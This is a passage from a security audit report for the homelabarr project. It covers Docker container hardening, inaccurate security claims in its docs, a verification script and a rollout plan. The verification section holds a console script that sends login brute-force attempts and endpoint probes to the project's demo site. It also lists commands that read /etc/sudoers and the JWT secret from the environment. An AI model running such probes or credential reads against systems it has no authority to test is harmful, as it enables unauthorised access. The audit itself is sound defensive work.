Replace every `res.status(5xx).json({ error, details, operation, ... })` with `sendError(req, res, 500, 'Internal server error', e)`.

---

### M-28. No `security_opt`, `cap_drop`, `read_only` on either container

**Where:** `homelabarr.yml` — neither service has hardening directives.

**Impact:** Containers run with default Docker caps (`SETUID`, `SETGID`, `NET_RAW`, `SYS_CHROOT`, etc.) and writable rootfs. Any RCE has more primitives than necessary.

**Fix:**
```yaml
frontend:
  # ... existing ...
  security_opt: [no-new-privileges:true]
  cap_drop: [ALL]
  cap_add: [CHOWN, SETUID, SETGID, NET_BIND_SERVICE]  # nginx minimum
  read_only: true
  tmpfs:
    - /var/cache/nginx
    - /var/run
    - /tmp

backend:
  # ... existing ...
  security_opt: [no-new-privileges:true]
  cap_drop: [ALL]
  # Backend needs nothing beyond Docker socket group access.
  # group_add already supplies that — no caps needed.
  read_only: true
  tmpfs:
    - /tmp
```

Test extensively — `read_only: true` will break anything that writes outside declared volumes/tmpfs.

---

### L-29. README claims rate limiting is "on" — true, but misleadingly generic

**Where:** README "Security" section
**Current quote:** "Rate limiting is on."

**Reality:** A single 100 req/min/IP global limiter. No login limiter (see C-8), no per-route limits, no per-user limits.

**Fix:** After C-8 lands, update README to be specific: "Login is throttled to 5 attempts per 15 minutes per IP+username. Global rate limit is 100 req/min per IP. Deployment endpoints are throttled separately to N per hour per user."

---

### L-30. README's "session tokens use crypto.randomBytes" claim is half-true

**Where:** README "Security" section
**Current quote:** "Session tokens use crypto.randomBytes, not Math.random."

**Reality:** Session tokens yes; user IDs no (M-19).

**Fix:** Fix M-19 first, then this becomes accurate.

---

### L-31. SECURITY.md and `homelabarr.yml` disagree on socket mount mode

**Where:** SECURITY.md L53 ("`:ro` where possible") vs `homelabarr.yml` L68 (`:rw`)

**Fix:** Pick one. Either ship the socket-proxy sidecar by default (C-7 option 1), or rewrite SECURITY.md to say "we mount RW and accept that risk because of X, and recommend the socket-proxy upgrade in §Y for production."

---

### L-32. CHANGELOG / commit history reveals "aggressive junk description filter" in dev branch merged 22 minutes pre-audit

**Where:** Latest commit `aa968c3` on `main`

**Note:** Not a vulnerability — flagging because the commit message style ("sanitize project history — replace drama with objective", "remove dead orphan files") suggests rapid iteration on text content. Anything that **renders** those descriptions (the app catalog UI) is a place to double-check H-13's `dangerouslySetInnerHTML` audit. If descriptions are markdown-rendered, they're an XSS sink fed by a YAML file that any contributor PR can modify.

**Fix:** Confirm app-template descriptions go through DOMPurify or a sanitizing renderer, not raw HTML.

---

## 4. Verification

After Rounds 2–N ship, run this from a browser console on `https://ce-demo.homelabarr.com/`:

```js
(async () => {
  const probes = [
    // No-auth surface should ALL be 401 except /health (minimal).
    ['/api/containers/x/logs', 'noauth'],
    ['/api/containers/x/stats', 'noauth'],
    ['/api/ports/check', 'noauth'],
    ['/api/ports/available', 'noauth'],
    ['/api/stream/progress', 'noauth'],
    // Login throttle: 6 wrong passwords should hit 429 before #6.
    ['/api/auth/login', 'brute'],
    // Security headers on SPA shell.
    ['/', 'headers'],
  ];
  const out = {};
  for (const [p, mode] of probes) {
    if (mode === 'brute') {
      for (let i = 0; i < 8; i++) {
        const r = await fetch(p, { method: 'POST', headers: { 'content-type': 'application/json' },
                                   body: JSON.stringify({ username: 'admin', password: 'wrong' + i }) });
        out[`brute_${i}`] = { status: r.status, remaining: r.headers.get('ratelimit-remaining') };
        if (r.status === 429) break;
      }
    } else if (mode === 'headers') {
      const r = await fetch(p, { cache: 'reload' });
      const want = ['content-security-policy','strict-transport-security','x-frame-options',
                    'x-content-type-options','referrer-policy','permissions-policy',
                    'cross-origin-opener-policy','cross-origin-resource-policy'];
      out['headers'] = Object.fromEntries(want.map(h => [h, r.headers.get(h) || 'MISSING']));
    } else {
      const r = await fetch(p, { cache: 'reload' });
      out[p] = { status: r.status };
    }
  }
  console.table(out);
  return out;
})();
```

**Pass criteria:**
- Every `noauth` probe returns 401
- `brute_5` (or earlier) returns 429
- Every header in `headers` returns a non-`MISSING` value
- No header is duplicated (no `, ` between two identical values)

Server-side, also verify:
- `docker exec homelabarr-backend cat /etc/sudoers | grep homelabarr` returns nothing
- `docker exec homelabarr-backend env | grep -i jwt_secret` shows a non-default value
- `docker exec homelabarr-backend ls -la /var/run/docker.sock` shows expected GID
- Build pipeline fails if any GitHub Action is unpinned (add a CI check)

---

## 5. Out of scope (Round 1)

Deferred to later rounds — not because they don't matter, just to keep this round shippable:

- **Round 2 candidate:** Frontend XSS audit (each `dangerouslySetInnerHTML` callsite, markdown rendering, log viewer escaping, link `rel` attributes)
- **Round 3 candidate:** Auth flow hardening (refresh tokens, session revocation list, MFA/TOTP option, password reset flow)
- **Round 4 candidate:** Docker socket proxy adoption + container hardening (cap_drop, read_only, security_opt) — see C-7 + M-28
- **Round 5 candidate:** Dependency hygiene (every transitive CVE, lockfile audit, supply-chain attestations via Sigstore)
- **Round 6 candidate:** Logging / observability / abuse detection (audit log integrity, fail2ban-equivalent for failed logins, alerting on anomalous deploys)
- **Round 7 candidate:** Secrets management (move all envvars to a real secrets manager — Docker secrets, Vault, SOPS — instead of compose env)
- **Round 8 candidate:** Production hardening guide (separate page from quickstart — assumes Cloudflare + Traefik + Authelia + socket-proxy as the recommended stack)

## 6. Owner pile (do not delegate to agent)

These are decisions or actions only Michael can take:

- **Decide:** Ship socket-proxy as default in `homelabarr.yml` (recommended), or keep current behavior and rewrite SECURITY.md to match
- **Decide:** Force-rotate JWTs on existing demo / production instances after C-1 lands (everyone re-logs in)
- **Decide:** Whether to keep `AUTH_ENABLED=false` as an option at all, or remove the toggle entirely and require auth always
- **Action:** Rotate the analytics website-id if you're concerned the current one is public (it is, in HTML)
- **Action:** Audit Cloudflare config for the demo subdomain — confirm WAF rules, rate limit rules, bot fight mode, HSTS at edge
- **Action:** After C-2 ships, post a CVE-style advisory on the GitHub Security tab so existing users know to update

---

## 7. Deliverable

Single PR titled: **`security: Round 1 baseline — close critical default-credential and auth-bypass chain (C-1..C-10)`**

PR description should include:
- Link back to this MD
- Explicit list of each C-1..C-10 finding and the commit that addresses it
- Migration note for existing users (force JWT rotation, password change required on next login)
- Updated SECURITY.md reflecting any policy changes

---

**End of Round 1 audit.**

Verified live on `ce-demo.homelabarr.com` and against `main` @ `aa968c3` on 2026-05-22.
